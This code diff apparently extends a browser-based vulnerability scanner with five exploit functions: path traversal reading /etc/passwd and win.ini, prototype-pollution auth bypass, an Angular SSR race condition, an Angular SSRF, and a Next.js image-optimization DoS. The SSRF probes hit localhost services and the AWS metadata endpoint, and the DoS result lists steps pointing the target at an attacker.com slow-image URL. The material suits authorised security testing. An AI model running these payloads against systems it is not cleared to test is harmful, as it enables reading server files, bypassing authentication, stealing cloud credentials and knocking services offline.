@@ -633,6 +633,24 @@ async function performExploit(vulnType, options = {}) {
     case 'CVE-2025-34291':
       return await testLangflowCORS(options);
 
+    case 'path-traversal':
+      return await testPathTraversal(options);
+
+    case 'prototype-pollution':
+      return await testPrototypePollution(options);
+
+    case 'angular-race-condition':
+    case 'CVE-2025-59052':
+      return await testAngularRaceCondition(options);
+
+    case 'angular-ssrf':
+    case 'CVE-2025-62427':
+      return await testAngularSSRF(options);
+
+    case 'image-dos':
+    case 'CVE-2024-47831':
+      return await testImageOptimizationDoS(options);
+
     default:
       throw new Error(`Exploit test not implemented for: ${vulnType}`);
   }
@@ -1148,6 +1166,510 @@ async function testLangflowCORS(options = {}) {
       message: 'Request failed: ' + e.message
     };
   }
+}
+
+/**
+ * Test Path Traversal vulnerability
+ * @param {Object} options - Test options
+ * @returns {Promise<Object>} - Test result
+ */
+async function testPathTraversal(options = {}) {
+  const traversalPath = options.command || '../../../../etc/passwd';
+  const endpoint = options.endpoint || '/api/image';
+
+  // Common file-serving endpoints to test
+  const testEndpoints = [
+    endpoint,
+    '/api/image',
+    '/api/file',
+    '/api/download',
+    '/api/asset',
+    '/api/serve'
+  ];
+
+  // Common parameter names
+  const paramNames = ['path', 'file', 'filename', 'src'];
+
+  // Indicators of successful /etc/passwd read
+  const passwdIndicators = ['root:', 'nobody:', 'daemon:', '/bin/bash', '/bin/sh', ':x:'];
+  const winIndicators = ['[fonts]', '[extensions]', '[mci extensions]'];
+
+  for (const ep of [...new Set(testEndpoints)]) {
+    for (const param of paramNames) {
+      try {
+        const testUrl = new URL(ep, window.location.origin);
+        testUrl.searchParams.set(param, traversalPath);
+
+        const response = await fetch(testUrl.toString(), {
+          method: 'GET',
+          signal: AbortSignal.timeout(5000)
+        });
+
+        if (!response.ok) continue;
+
+        const text = await response.text();
+
+        // Check for Linux passwd file
+        const matchedPasswd = passwdIndicators.filter(ind => text.includes(ind));
+        if (matchedPasswd.length >= 2) {
+          return {
+            vulnerable: true,
+            output: text.substring(0, 1000),
+            endpoint: ep,
+            param,
+            payload: traversalPath,
+            message: `Path traversal confirmed! Read /etc/passwd via ${ep}?${param}=`,
+            severity: 'CRITICAL',
+            matchedIndicators: matchedPasswd
+          };
+        }
+
+        // Check for Windows win.ini
+        const matchedWin = winIndicators.filter(ind => text.includes(ind));
+        if (matchedWin.length >= 1) {
+          return {
+            vulnerable: true,
+            output: text.substring(0, 1000),
+            endpoint: ep,
+            param,
+            payload: traversalPath,
+            message: `Path traversal confirmed! Read win.ini via ${ep}?${param}=`,
+            severity: 'CRITICAL'
+          };
+        }
+      } catch (e) {
+        // Continue to next endpoint
+      }
+    }
+  }
+
+  return {
+    vulnerable: false,
+    message: 'Path traversal not detected on tested endpoints',
+    testedEndpoints: testEndpoints,
+    suggestion: 'Try different file paths or parameter names'
+  };
+}
+
+/**
+ * Test Prototype Pollution auth bypass vulnerability
+ * @param {Object} options - Test options
+ * @returns {Promise<Object>} - Test result
+ */
+async function testPrototypePollution(options = {}) {
+  const endpoint = options.endpoint || '/api/test-action';
+
+  // Common auth endpoints to test
+  const testEndpoints = [
+    endpoint,
+    '/api/auth',
+    '/api/login',
+    '/api/user',
+    '/api/admin',
+    '/api/profile',
+    '/api/account'
+  ];
+
+  // Prototype pollution payloads
+  const pollutionPayloads = [
+    { name: '__proto__.isAdmin', payload: { "__proto__": { "isAdmin": true }, "username": "test" } },
+    { name: '__proto__.role', payload: { "__proto__": { "role": "admin" }, "username": "test" } },
+    { name: '__proto__.authenticated', payload: { "__proto__": { "authenticated": true }, "username": "test" } },
+    { name: 'constructor.prototype', payload: { "constructor": { "prototype": { "isAdmin": true } }, "username": "test" } }
+  ];
+
+  // Indicators of auth bypass
+  const bypassIndicators = ['admin', 'secret', 'granted', 'authorized', 'private', 'token', 'jwt', 'API_KEY'];
+
+  for (const ep of [...new Set(testEndpoints)]) {
+    // First get baseline
+    let baselineBody = '';
+    let baselineStatus = 0;
+
+    try {
+      const baselineUrl = new URL(ep, window.location.origin);
+      const baselineResponse = await fetch(baselineUrl.toString(), {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: 'test' }),
+        signal: AbortSignal.timeout(5000)
+      });
+      baselineStatus = baselineResponse.status;
+      baselineBody = await baselineResponse.text();
+    } catch (e) {
+      continue; // Endpoint doesn't work
+    }
+
+    // Test with pollution payloads
+    for (const { name, payload } of pollutionPayloads) {
+      try {
+        const testUrl = new URL(ep, window.location.origin);
+        const response = await fetch(testUrl.toString(), {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+          signal: AbortSignal.timeout(5000)
+        });
+
+        const body = await response.text();
+
+        // Check for new sensitive data not in baseline
+        const foundIndicators = bypassIndicators.filter(ind =>
+          body.toLowerCase().includes(ind.toLowerCase()) &&
+          !baselineBody.toLowerCase().includes(ind.toLowerCase())
+        );
+
+        if (foundIndicators.length >= 1) {
+          return {
+            vulnerable: true,
+            output: body.substring(0, 1000),
+            endpoint: ep,
+            payload: JSON.stringify(payload),
+            pollutionType: name,
+            message: `Prototype pollution auth bypass confirmed via ${name}!`,
+            severity: 'CRITICAL',
+            foundIndicators,
+            statusChange: baselineStatus !== response.status ? {
+              baseline: baselineStatus,
+              polluted: response.status
+            } : null
+          };
+        }
+
+        // Check for status change (403/401 -> 200)
+        if ((baselineStatus === 401 || baselineStatus === 403) && response.status === 200) {
+          return {
+            vulnerable: true,
+            endpoint: ep,
+            payload: JSON.stringify(payload),
+            pollutionType: name,
+            message: `Auth bypass! Status changed from ${baselineStatus} to ${response.status}`,
+            severity: 'CRITICAL',
+            statusChange: { baseline: baselineStatus, polluted: response.status }
+          };
+        }
+      } catch (e) {
+        // Continue
+      }
+    }
+  }
+
+  return {
+    vulnerable: false,
+    message: 'Prototype pollution auth bypass not detected',
+    testedEndpoints: testEndpoints,
+    suggestion: 'Try targeting specific API endpoints that handle user data'
+  };
+}
+
+/**
+ * Test Angular SSR Race Condition vulnerability (CVE-2025-59052)
+ * @param {Object} options - Test options
+ * @returns {Promise<Object>} - Test result
+ */
+async function testAngularRaceCondition(options = {}) {
+  const concurrency = options.concurrency || 20;
+  const iterations = options.iterations || 3;
+  const targetUrl = options.endpoint || window.location.href;
+
+  // This test sends concurrent requests to detect if user data leaks between requests
+  // We look for variations in response that shouldn't occur for identical requests
+
+  const results = [];
+  const responseBodies = new Set();
+
+  for (let i = 0; i < iterations; i++) {
+    // Send concurrent requests
+    const requests = Array(concurrency).fill(null).map(() =>
+      fetch(targetUrl, {
+        method: 'GET',
+        headers: {
+          'X-BlueDragon-Race-Test': Math.random().toString(36).substr(2, 9)
+        },
+        credentials: 'include',
+        signal: AbortSignal.timeout(10000)
+      }).then(async res => {
+        const body = await res.text();
+        return { status: res.status, body, headers: Object.fromEntries(res.headers) };
+      }).catch(e => ({ error: e.message }))
+    );
+
+    const responses = await Promise.all(requests);
+
+    // Analyze responses for variations
+    for (const res of responses) {
+      if (res.body) {
+        // Extract user-specific content that might leak
+        const userPatterns = [
+          /user[_-]?id["':]\s*["']?(\d+|[a-f0-9-]+)/gi,
+          /email["':]\s*["']([^"']+)/gi,
+          /username["':]\s*["']([^"']+)/gi,
+          /session[_-]?id["':]\s*["']([^"']+)/gi
+        ];
+
+        for (const pattern of userPatterns) {
+          const matches = res.body.match(pattern);
+          if (matches) {
+            responseBodies.add(JSON.stringify(matches));
+          }
+        }
+      }
+    }
+
+    results.push({
+      iteration: i + 1,
+      successfulRequests: responses.filter(r => !r.error).length,
+      errors: responses.filter(r => r.error).length
+    });
+  }
+
+  // If we see multiple different user identifiers, it's a potential race condition
+  if (responseBodies.size > 1) {
+    return {
+      vulnerable: 'possible',
+      message: 'Detected variation in user-specific data across concurrent requests!',
+      severity: 'HIGH',
+      note: 'This may indicate race condition data leakage. Manual verification required.',
+      uniqueResponses: responseBodies.size,
+      results
+    };
+  }
+
+  return {
+    vulnerable: 'unknown',
+    message: 'Race condition test completed. No obvious data leakage detected.',
+    note: 'This vulnerability requires high-concurrency traffic and specific conditions to trigger.',
+    suggestion: 'Test with authenticated sessions and compare responses for different users',
+    results
+  };
+}
+
+/**
+ * Test Angular SSR SSRF vulnerability (CVE-2025-62427)
+ * Uses double-slash URL injection to trigger SSRF
+ * @param {Object} options - Test options
+ * @returns {Promise<Object>} - Test result
+ */
+async function testAngularSSRF(options = {}) {
+  const collaboratorUrl = options.collaboratorUrl || settings?.collaboratorUrl;
+  const collaboratorId = 'bd-' + Math.random().toString(36).substr(2, 9);
+
+  // Double-slash SSRF payloads
+  const ssrfPayloads = [
+    `//httpbin.org/get?test=${collaboratorId}`,
+    `//example.com/ssrf-test`,
+    `//localhost:22/`, // SSH probe
+    `//localhost:6379/`, // Redis probe
+    `//169.254.169.254/latest/meta-data/` // AWS metadata
+  ];
+
+  if (collaboratorUrl) {
+    ssrfPayloads.unshift(`//${collaboratorId}.${collaboratorUrl}/ssrf`);
+  }
+
+  const results = [];
+
+  for (const payload of ssrfPayloads) {
+    try {
+      // Try accessing the double-slash URL directly
+      const testUrl = new URL(window.location.origin + payload);
+
+      const response = await fetch(testUrl.toString(), {
+        method: 'GET',
+        headers: {
+          'X-BlueDragon-SSRF-Test': collaboratorId
+        },
+        redirect: 'manual',
+        signal: AbortSignal.timeout(5000)
+      });
+
+      const statusCode = response.status;
+
+      // Check for indicators of SSRF
+      if (statusCode === 200) {
+        const body = await response.text();
+
+        // Check if we got external content
+        if (body.includes('httpbin') || body.includes(collaboratorId)) {
+          return {
+            vulnerable: true,
+            payload,
+            message: 'SSRF confirmed! External URL was fetched via double-slash injection.',
+            severity: 'CRITICAL',
+            statusCode,
+            evidence: body.substring(0, 500)
+          };
+        }
+
+        // Check for cloud metadata
+        if (body.includes('ami-id') || body.includes('instance-id') || body.includes('security-credentials')) {
+          return {
+            vulnerable: true,
+            payload,
+            message: 'CRITICAL: AWS metadata accessed via SSRF!',
+            severity: 'CRITICAL',
+            evidence: body.substring(0, 500)
+          };
+        }
+      }
+
+      // Check for redirect that might indicate SSRF processing
+      if (statusCode === 302 || statusCode === 301) {
+        const location = response.headers.get('location');
+        if (location && (location.includes('httpbin') || location.includes(collaboratorUrl))) {
+          return {
+            vulnerable: 'possible',
+            payload,
+            message: 'Server redirected to external URL. SSRF may be possible.',
+            redirectLocation: location,
+            statusCode
+          };
+        }
+      }
+
+      results.push({ payload, statusCode, note: 'No SSRF indication' });
+
+    } catch (e) {
+      results.push({ payload, error: e.message });
+    }
+  }
+
+  // If collaborator URL configured, tell user to check
+  if (collaboratorUrl) {
+    return {
+      vulnerable: 'possible',
+      message: 'SSRF probes sent. Check your collaborator for incoming requests.',
+      collaboratorId,
+      note: `Look for requests to ${collaboratorId}.${collaboratorUrl}`,
+      results
+    };
+  }
+
+  return {
+    vulnerable: false,
+    message: 'SSRF via double-slash injection not detected.',
+    suggestion: 'Configure a collaborator URL for out-of-band detection',
+    results
+  };
+}
+
+/**
+ * Test Image Optimization DoS vulnerability (CVE-2024-47831)
+ * Tests if external URLs can be fetched via /_next/image endpoint
+ * @param {Object} options - Test options
+ * @returns {Promise<Object>} - Test result
+ */
+async function testImageOptimizationDoS(options = {}) {
+  const externalUrl = options.command || 'https://httpbin.org/image/png';
+  const imageEndpoint = '/_next/image';
+
+  // Test different image sizes to check for resource exhaustion potential
+  const testCases = [
+    { w: 64, q: 75, desc: 'small' },
+    { w: 1920, q: 100, desc: 'large' },
+    { w: 3840, q: 100, desc: 'extra large' }
+  ];
+
+  const results = [];
+
+  for (const test of testCases) {
+    try {
+      const testUrl = new URL(imageEndpoint, window.location.origin);
+      testUrl.searchParams.set('url', externalUrl);
+      testUrl.searchParams.set('w', test.w.toString());
+      testUrl.searchParams.set('q', test.q.toString());
+
+      const startTime = Date.now();
+
+      const response = await fetch(testUrl.toString(), {
+        method: 'GET',
+        signal: AbortSignal.timeout(15000)
+      });
+
+      const elapsed = Date.now() - startTime;
+      const contentType = response.headers.get('content-type') || '';
+      const contentLength = response.headers.get('content-length') || '0';
+
+      if (response.ok && contentType.includes('image')) {
+        results.push({
+          size: test.desc,
+          width: test.w,
+          quality: test.q,
+          status: response.status,
+          contentType,
+          contentLength: parseInt(contentLength),
+          elapsed,
+          success: true
+        });
+      } else if (response.status === 400) {
+        results.push({
+          size: test.desc,
+          status: 400,
+          note: 'External URL blocked by configuration',
+          success: false
+        });
+      } else {
+        results.push({
+          size: test.desc,
+          status: response.status,
+          success: false
+        });
+      }
+    } catch (e) {
+      results.push({
+        size: test.desc,
+        error: e.message,
+        success: false
+      });
+    }
+  }
+
+  const successfulTests = results.filter(r => r.success);
+
+  if (successfulTests.length > 0) {
+    // Check if large images took significantly longer (DoS potential)
+    const smallTest = results.find(r => r.size === 'small' && r.success);
+    const largeTest = results.find(r => r.size === 'extra large' && r.success);
+
+    let dosIndicator = false;
+    if (smallTest && largeTest && largeTest.elapsed > smallTest.elapsed * 3) {
+      dosIndicator = true;
+    }
+
+    return {
+      vulnerable: true,
+      message: 'Image optimization accepts external URLs! Potential for SSRF and resource exhaustion.',
+      severity: dosIndicator ? 'HIGH' : 'MEDIUM',
+      externalUrl,
+      endpoint: imageEndpoint,
+      results,
+      dosIndicator,
+      exploitSteps: [
+        '1. External URL fetch confirmed - potential SSRF',
+        '2. Large image processing can exhaust server resources',
+        '3. Chain with slow/infinite image sources for DoS',
+        '4. Try: ?url=http://attacker.com/slow-image.php&w=3840&q=100'
+      ]
+    };
+  }
+
+  // Check if endpoint exists but blocks external URLs
+  const blocked = results.some(r => r.status === 400);
+  if (blocked) {
+    return {
+      vulnerable: false,
+      message: 'Image endpoint exists but external URLs are properly restricted.',
+      note: 'images.domains is configured correctly',
+      results
+    };
+  }
+
+  return {
+    vulnerable: false,
+    message: 'Image optimization endpoint not accessible or not vulnerable.',
+    results,
+    suggestion: 'Endpoint may require specific URL patterns or domains'
+  };
 }
 
 /**
